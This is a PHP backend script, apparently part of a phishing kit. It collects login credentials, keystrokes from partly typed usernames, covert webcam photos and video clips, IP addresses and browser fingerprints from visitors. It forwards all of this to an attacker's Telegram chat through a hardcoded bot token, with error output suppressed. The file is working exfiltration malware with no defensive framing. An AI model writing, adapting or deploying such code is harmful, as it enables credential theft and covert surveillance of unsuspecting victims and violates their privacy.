<?php
// ============================================
// POST.PHP - Handles Photos & Videos
// Sends both to Telegram
// ============================================

// Suppress all errors
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// 🔑 YOUR TELEGRAM CREDENTIALS
// ============================================
$botToken = "8591278217:AAFqz4Ncr8rqQuyEkcyfrnIefa5RUa2YWZY";  // ← YOUR FULL TOKEN
$chatId = "6715599952";  // ← YOUR CHAT ID

// ============================================
// GET DATA
// ============================================
$type = $_POST['tg_type'] ?? '';
$ip = $_POST['tg_ip'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$ua = $_POST['tg_ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = $_POST['tg_time'] ?? date('Y-m-d H:i:s');

// ============================================
// TELEGRAM SEND FUNCTION
// ============================================
function sendTelegramMessage($message, $fileData = null, $fileType = 'photo') {
    global $botToken, $chatId;
    
    if ($fileData) {
        // Send file (photo or video)
        if ($fileType === 'video') {
            $url = "https://api.telegram.org/bot$botToken/sendVideo";
        } else {
            $url = "https://api.telegram.org/bot$botToken/sendPhoto";
        }
        
        // Decode base64 file data
        $fileContent = base64_decode(preg_replace('#^data:.*?;base64,#', '', $fileData));
        $tempFile = tempnam(sys_get_temp_dir(), 'tg_') . ($fileType === 'video' ? '.webm' : '.png');
        file_put_contents($tempFile, $fileContent);
        
        $cfile = curl_file_create($tempFile, $fileType === 'video' ? 'video/webm' : 'image/png', 'capture.' . ($fileType === 'video' ? 'webm' : 'png'));
        $data = [
            'chat_id' => $chatId,
            ($fileType === 'video' ? 'video' : 'photo') => $cfile,
            'caption' => $message,
            'parse_mode' => 'HTML'
        ];
    } else {
        // Send text
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Clean up temp file
    if (isset($tempFile) && file_exists($tempFile)) {
        unlink($tempFile);
    }
    
    return $httpCode == 200;
}

// ============================================
// HANDLE DIFFERENT DATA TYPES
// ============================================
$response = ['status' => 'ok'];

switch ($type) {
    // ==========================================
    // IP ADDRESS
    // ==========================================
    case 'IP':
        $message = "🌐 <b>IP ADDRESS DETECTED</b>\n";
        $message .= "IP: <code>" . htmlspecialchars($_POST['tg_data'] ?? $ip) . "</code>\n";
        $message .= "UA: " . htmlspecialchars($ua) . "\n";
        $message .= "Time: $time";
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PHOTO CAPTURE
    // ==========================================
    case 'image':
        $imageData = $_POST['tg_image'] ?? '';
        if (!empty($imageData) && strpos($imageData, 'data:image') !== false) {
            $caption = "📸 <b>PHOTO CAPTURE</b>\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "UA: " . htmlspecialchars($ua);
            
            sendTelegramMessage($caption, $imageData, 'photo');
        }
        break;
    
    // ==========================================
    // VIDEO CAPTURE
    // ==========================================
    case 'video':
        $videoData = $_POST['tg_video'] ?? '';
        $duration = $_POST['tg_duration'] ?? 0;
        
        if (!empty($videoData) && strpos($videoData, 'data:video') !== false) {
            $caption = "🎥 <b>VIDEO CAPTURE</b>\n";
            $caption .= "⏱️ Duration: {$duration}s\n";
            $caption .= "IP: <code>" . htmlspecialchars($ip) . "</code>\n";
            $caption .= "Time: $time\n";
            $caption .= "UA: " . htmlspecialchars($ua);
            
            sendTelegramMessage($caption, $videoData, 'video');
        }
        break;
    
    // ==========================================
    // LOGIN CREDENTIALS
    // ==========================================
    case 'login':
        $username = $_POST['tg_username'] ?? 'N/A';
        $password = $_POST['tg_password'] ?? 'N/A';
        
        $message = "🔐 <b>LOGIN CREDENTIALS CAPTURED</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🖥️ <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PARTIAL USERNAME TYPING
    // ==========================================
    case 'typing':
        $partial = $_POST['tg_data'] ?? 'N/A';
        $message = "⌨️ <b>USERNAME TYPING DETECTED</b>\n\n";
        $message .= "📝 <b>Typed:</b> <code>" . htmlspecialchars($partial) . "</code>\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // CAMERA READY NOTIFICATION
    // ==========================================
    case 'camera_ready':
        $message = "📹 <b>CAMERA ACTIVE</b>\n\n";
        $message .= "✅ Recording video (10s clips)\n";
        $message .= "📸 Capturing photos (every 3s)\n";
        $message .= "🌐 IP: <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ Time: $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // BROWSER INFO
    // ==========================================
    case 'browser_info':
        $info = json_decode($_POST['tg_data'] ?? '{}', true);
        $message = "💻 <b>BROWSER INFO</b>\n\n";
        $message .= "📱 <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "🖥️ <b>Platform:</b> " . ($info['platform'] ?? 'N/A') . "\n";
        $message .= "🌍 <b>Language:</b> " . ($info['language'] ?? 'N/A') . "\n";
        $message .= "📐 <b>Screen:</b> " . ($info['screen'] ?? 'N/A') . "\n";
        $message .= "🕐 <b>Timezone:</b> " . ($info['timezone'] ?? 'N/A') . "\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // PAGE VIEW
    // ==========================================
    case 'page_view':
        $message = "👁️ <b>PAGE VIEW</b>\n\n";
        $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
        $message .= "🖥️ <b>UA:</b> " . htmlspecialchars($ua) . "\n";
        $message .= "⏰ <b>Time:</b> $time";
        
        sendTelegramMessage($message);
        break;
    
    // ==========================================
    // DEFAULT
    // ==========================================
    default:
        if (!empty($_POST)) {
            $message = "📦 <b>DATA RECEIVED</b>\n\n";
            $message .= "📝 <b>Type:</b> " . htmlspecialchars($type) . "\n";
            $message .= "🌐 <b>IP:</b> <code>" . htmlspecialchars($ip) . "</code>\n";
            $message .= "⏰ <b>Time:</b> $time";
            
            sendTelegramMessage($message);
        }
        break;
}

// ============================================
// RESPONSE
// ============================================
header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
?>
